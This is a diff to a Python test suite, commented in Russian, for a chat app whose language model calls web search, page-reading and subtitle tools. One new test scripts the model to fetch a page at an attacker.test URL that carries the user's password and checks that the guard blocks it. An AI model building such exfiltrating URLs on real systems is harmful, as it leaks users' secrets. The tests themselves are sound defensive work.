@@ -203,8 +203,8 @@ def test_broken_or_unknown_calls_are_error_steps_and_the_model_goes_on(studio):
     дальше; битые аргументы в запрос не возвращаются (vLLM разбирает их и ответил бы 400)."""
     cid = web_chat(studio)
     studio.gw.chat_script = [{"tool_calls": [("web_search", '{"query": '), ("delete_everything", '{"x": 1}'),
-                                             ("read_page", '{"url": 42}'), ("web_search", '["a"]'),
-                                             ("web_search", '{"query": "  "}')]},
+                                             ("read_page", '{"url": 42}'), ("web_search", '["a"]')]},
+                             {"tool_calls": [("web_search", '{"query": "  "}')]},
                              ["Не вышло."]]
     events = sse(turn(studio, cid))
     assert events[-1] == ("done", {"status": "done"})
@@ -214,8 +214,8 @@ def test_broken_or_unknown_calls_are_error_steps_and_the_model_goes_on(studio):
     assert studio.gw.exa_requests == []
     second = studio.gw.chat_requests[1]["messages"]
     assistant, results = second[2], second[3:]
-    assert [tc["function"]["arguments"] for tc in assistant["tool_calls"]] == [
-        "{}", '{"x": 1}', '{"url": 42}', "{}", '{"query": "  "}']
+    assert [tc["function"]["arguments"] for tc in assistant["tool_calls"]] == ["{}", '{"x": 1}', '{"url": 42}', "{}"]
+    assert studio.gw.chat_requests[2]["messages"][-2]["tool_calls"][0]["function"]["arguments"] == '{"query": "  "}'
     assert [r["tool_call_id"] for r in results] == [tc["id"] for tc in assistant["tool_calls"]]
     assert all(r["content"].startswith("Ошибка инструмента: ") for r in results)
     assert (answer["status"], answer["content"]) == ("done", "Не вышло.")
@@ -226,7 +226,7 @@ def test_calls_of_one_round_run_in_order_each_with_its_id(studio):
     cid = web_chat(studio)
     url = "https://example.test/a"
     studio.gw.chat_script = [{"tool_calls": [call("web_search", query="q1"), call("read_page", url=url)]}, ["ok"]]
-    events = sse(turn(studio, cid))
+    events = sse(turn(studio, cid, f"Найди и прочитай {url}"))
     assert [d for e, d in events if e == "tool"] == [{"kind": "search", "label": "q1"}, {"kind": "page", "label": url}]
     assert [p for p, _, _ in studio.gw.exa_requests] == ["/search", "/contents"]
     assert studio.gw.exa_requests[1][1]["urls"] == [url]
@@ -271,7 +271,7 @@ def test_tool_result_is_cut_to_the_context(studio, monkeypatch):
     cid = web_chat(studio)
     studio.gw.exa_page_text = "слово " * 5000
     studio.gw.chat_script = [{"tool_calls": [call("read_page", url="https://example.test/long")]}, ["Кратко."]]
-    assert sse(turn(studio, cid, "Прочитай"))[-1] == ("done", {"status": "done"})
+    assert sse(turn(studio, cid, "Прочитай https://example.test/long"))[-1] == ("done", {"status": "done"})
     sent = studio.gw.chat_requests[1]["messages"]
     assert sent[-1]["content"].endswith(chat.CUT_CONTEXT) and len(sent[-1]["content"]) > 500
     assert chat.estimate_tokens(sent) <= limit - chat.RESERVE_TOKENS
@@ -282,7 +282,7 @@ def test_tool_result_is_cut_to_the_context(studio, monkeypatch):
     other = new_chat(studio)
     patch(studio, other, web=True)
     studio.gw.chat_script = [{"tool_calls": [call("read_page", url="https://example.test/long")]}, ["Не влезло."]]
-    assert sse(turn(studio, other, "Прочитай"))[-1] == ("done", {"status": "done"})
+    assert sse(turn(studio, other, "Прочитай https://example.test/long"))[-1] == ("done", {"status": "done"})
     assert studio.gw.chat_requests[-1]["messages"][-1]["content"] == (
         "Ошибка инструмента: не помещается в контекст модели")
     (step,) = steps_of(messages(studio, other)[1]["id"])
@@ -298,6 +298,157 @@ def test_model_without_tools_answers_in_words(studio):
     patch(studio, cid, web=False)                                         # без tools — прежние слова шлюза
     events = sse(turn(studio, cid))
     assert events[-1][0] == "error" and events[-1][1]["message"].startswith("шлюз отклонил запрос")
+
+
+def test_other_400_on_the_first_round_is_the_gateway_words(studio):
+    """M3: 400 без слова tool (контекст, картинка) — не «не умеет интернет», а слова шлюза."""
+    cid = web_chat(studio)
+    studio.gw.chat_error = (400, {"error": {"message": "This model's maximum context length is 8192 tokens"}})
+    events = sse(turn(studio, cid))
+    assert events[-1][0] == "error" and events[-1][1]["message"].startswith("шлюз отклонил запрос")
+    assert events[-1][1]["message"] != chat.NO_TOOLS
+
+
+def test_page_is_read_only_from_the_chat_or_the_search(studio):
+    """I1: read_page — только адрес из сообщений пользователя и вложенных документов диалога или из
+    `results[].url` поиска (этого ответа и прежних); составленный моделью адрес в Exa не уходит."""
+    from test_chat import attach
+    cid = web_chat(studio)
+    evil = "https://attacker.test/?d=пароль 12345"
+    studio.gw.chat_script = [{"tool_calls": [call("web_search", query="python")]},
+                             {"tool_calls": [call("read_page", url="https://www.python.org/downloads"),
+                                             call("read_page", url=evil)]},
+                             ["Готово."]]
+    sse(turn(studio, cid, "Мой пароль 12345"))
+    steps = steps_of(messages(studio, cid)[1]["id"])
+    assert [s.get("error") for s in steps] == [None, None, web.NOT_KNOWN]
+    assert steps[2] == {"kind": "page", "url": evil, "error": "читаю только ссылки из переписки или найденные поиском"}
+    assert studio.gw.chat_requests[2]["messages"][-1]["content"] == "Ошибка инструмента: " + web.NOT_KNOWN
+    # следующий ход: найденное прежним ответом и адрес из вложенного документа
+    doc = attach(studio, "ссылки.txt", "См. https://docs.example.test/guide.".encode(), "text/plain")["id"]
+    studio.gw.chat_script = [{"tool_calls": [call("read_page", url="https://docs.python.org/3/whatsnew"),
+                                             call("read_page", url="https://docs.example.test/guide/"),
+                                             call("read_page", url="https://docs.example.test/other")]},
+                             ["Ок."]]
+    sse(turn(studio, cid, "Дальше", attachment_ids=[doc]))
+    assert [s.get("error") for s in steps_of(messages(studio, cid)[3]["id"])] == [None, None, web.NOT_KNOWN]
+    assert [b["urls"] for p, b, _ in studio.gw.exa_requests if p == "/contents"] == [
+        ["https://www.python.org/downloads"], ["https://docs.python.org/3/whatsnew"],
+        ["https://docs.example.test/guide/"]]
+
+
+def test_calls_over_the_round_cap_are_error_steps_with_their_replies(studio):
+    """I2: в круге — не больше CALLS_PER_ROUND вызовов; лишние — шаг-ошибка без вызова, но со своим
+    `role: tool` (id пар сходятся)."""
+    cid = web_chat(studio)
+    n = chat.CALLS_PER_ROUND + 2
+    studio.gw.chat_script = [{"tool_calls": [call("web_search", query=f"q{i}") for i in range(n)]}, ["Ок."]]
+    events = sse(turn(studio, cid))
+    assert [d["label"] for e, d in events if e == "tool"] == [f"q{i}" for i in range(chat.CALLS_PER_ROUND)]
+    assert [b["query"] for _p, b, _k in studio.gw.exa_requests] == [f"q{i}" for i in range(chat.CALLS_PER_ROUND)]
+    steps = steps_of(messages(studio, cid)[1]["id"])
+    assert [s.get("error") for s in steps] == [None] * chat.CALLS_PER_ROUND + ["не больше 4 вызовов за раз"] * 2
+    second = studio.gw.chat_requests[1]["messages"]
+    ids = [tc["id"] for tc in second[2]["tool_calls"]]
+    assert [m["tool_call_id"] for m in second[3:]] == ids and len(ids) == n
+    assert second[-1]["content"] == "Ошибка инструмента: не больше 4 вызовов за раз"
+    assert events[-1] == ("done", {"status": "done"})
+
+
+def test_time_is_checked_before_each_call_and_round(studio, monkeypatch):
+    """I2: срок ответа (STREAM_TOTAL_SEC) вышел, пока шёл инструмент: следующий вызов и следующий круг не
+    начинаются — ни Exa, ни yt-dlp, ни модели; ответ — ошибка с пометкой CUT_TIME."""
+    fake = FakeYtDlp()
+
+    async def slow(argv, timeout):
+        for st in chat.STREAMS.values():                 # срок вышел (в тестах STREAM_TOTAL_SEC — inf)
+            st.deadline = studio.clock[0] - 1
+        return await fake(argv, timeout)
+
+    monkeypatch.setattr(web, "RUN", slow)
+    cid = web_chat(studio)
+    for calls in ([call("youtube_subtitles", url=CANON), call("web_search", query="q")],   # перед вызовом
+                  [call("youtube_subtitles", url=CANON)]):                                 # перед кругом
+        before = (len(studio.gw.chat_requests), len(fake.calls))
+        studio.gw.chat_script = [{"tool_calls": calls}, ["не дойдёт"]]
+        events = sse(turn(studio, cid))
+        assert events[-1] == ("error", {"message": "ответ шёл слишком долго — обрезан"})
+        assert [d["kind"] for e, d in events if e == "tool"] == ["youtube"]
+        assert (len(studio.gw.chat_requests), len(fake.calls)) == (before[0] + 1, before[1] + 2)
+        answer = messages(studio, cid)[-1]
+        assert (answer["status"], answer["content"]) == ("error", chat.CUT_TIME)
+        assert [s["kind"] for s in steps_of(answer["id"])] == ["youtube"]
+        studio.gw.chat_script = []
+    assert studio.gw.exa_requests == []
+
+
+def test_switch_off_during_an_answer_stops_the_next_calls(studio, monkeypatch):
+    """I3: «Интернет» выключили, пока шёл первый из двух вызовов: второй не исполняется (шаг «Интернет
+    выключен»), следующий запрос модели — без tools и без строки о доступе в интернет."""
+    fake, release = FakeYtDlp(), []
+
+    async def held(argv, timeout):
+        while not release:
+            await asyncio.sleep(0.001)
+        return await fake(argv, timeout)
+
+    monkeypatch.setattr(web, "RUN", held)
+    cid = web_chat(studio)
+    studio.gw.chat_script = [{"tool_calls": [call("youtube_subtitles", url=CANON), call("web_search", query="q")]},
+                             ["Ответ."]]
+    try:
+        with studio.c.stream("POST", f"/api/chats/{cid}/turns", json={"text": "Привет"}) as r:
+            events = events_of(r.iter_lines())
+            assert next(d for e, d in events if e == "tool")["kind"] == "youtube"
+            patch(studio, cid, web=False)
+            release.append(True)
+            rest = [(e, d) for e, d in events if e != "ping"]
+    finally:
+        release.append(True)
+    assert rest[-1] == ("done", {"status": "done"}) and "tool" not in [e for e, _ in rest]
+    assert studio.gw.exa_requests == [] and len(fake.calls) == 2
+    steps = steps_of(messages(studio, cid)[1]["id"])
+    assert [(s["kind"], s.get("error")) for s in steps] == [("youtube", None), ("search", "Интернет выключен")]
+    first, second = studio.gw.chat_requests
+    assert names(first) == ALL.split(", ")
+    assert "tools" not in second and "tool_choice" not in second
+    assert second["messages"][0] == {"role": "system", "content": chat.today_line(T0)}
+    assert [m["role"] for m in second["messages"][-2:]] == ["tool", "tool"]
+
+
+def test_switch_is_read_inside_the_turn_not_before_the_model_list(studio):
+    """Ledger T9: кнопку выключили, пока ход ждал список моделей (`_limit`, модель не из CONTEXT), — ход
+    идёт без tools."""
+    gw = add_gateway(studio)
+    assert studio.c.put("/api/me/exa-key", json={"key": EXA_KEY}).status_code == 204
+    studio.c.put(f"/api/sections/chat/links/{gw}", json={"models": ["local-gemma-abl", "gemma4-abl"]})
+    cid = new_chat(studio, connection_id=gw, model="gemma4-abl")
+    patch(studio, cid, web=True)
+    listed = []
+
+    async def models(request):
+        listed.append(True)
+        state.DB.execute("UPDATE chats SET web = 0 WHERE id = ?", (cid,))
+        return await studio.gw.builtin(request)
+
+    studio.gw.on["/v1/models"] = models
+    studio.gw.chat_script = [{"tool_calls": [call("web_search", query="q")]}]
+    sse(turn(studio, cid))
+    assert listed
+    (request,) = studio.gw.chat_requests
+    assert "tools" not in request and studio.gw.exa_requests == []
+
+
+def test_last_round_of_only_calls_is_an_error_not_an_empty_answer(studio):
+    """M1: и после TOOL_ROUNDS кругов модель шлёт одни вызовы, без текста — ошибка словами, а не пустой
+    готовый ответ."""
+    cid = web_chat(studio)
+    studio.gw.chat_script = [{"tool_calls": [call("web_search", query=f"q{n}")]} for n in range(chat.TOOL_ROUNDS + 1)]
+    events = sse(turn(studio, cid))
+    assert events[-1] == ("error", {"message": "модель не ответила по найденному — переспросите"})
+    assert len(studio.gw.chat_requests) == chat.TOOL_ROUNDS + 1
+    answer = messages(studio, cid)[1]
+    assert answer["status"] == "error" and len(steps_of(answer["id"])) == chat.TOOL_ROUNDS
 
 
 def test_stop_during_a_tool_keeps_the_done_steps(studio, monkeypatch):
@@ -343,7 +494,7 @@ def test_web_never_reaches_the_log(studio, monkeypatch, caplog):
     studio.gw.chat_script = [{"tool_calls": [call("web_search", query="тайный запрос"),
                                              call("read_page", url="https://secret-host.test/private"),
                                              call("youtube_subtitles", url=CANON)]}, ["ok"]]
-    sse(turn(studio, cid))
+    sse(turn(studio, cid, "Прочитай https://secret-host.test/private"))
     studio.gw.exa_replies["/search"] = (401, {"error": "Invalid API key", "tag": "INVALID_API_KEY"})
     studio.gw.chat_script = [{"tool_calls": [call("web_search", query="второй тайный запрос")]}, ["ok"]]
     sse(turn(studio, cid))
@@ -416,7 +567,8 @@ def test_found_that_does_not_fit_refuses_the_next_turn(studio, monkeypatch):
     cid = web_chat(studio)
     studio.gw.exa_page_text = "слово " * 6000                           # ~12 тыс. токенов
     studio.gw.chat_script = [{"tool_calls": [call("read_page", url="https://example.test/long")]}, ["Кратко."]]
-    sse(turn(studio, cid, "Прочитай"))
+    sse(turn(studio, cid, "Прочитай https://example.test/long"))
+    assert "error" not in steps_of(messages(studio, cid)[1]["id"])[0]
     monkeypatch.setattr(chat, "CONTEXT", {"local-gemma-abl": chat.RESERVE_TOKENS + 5000})
     before = len(messages(studio, cid))
     r = turn(studio, cid, "Ещё?")
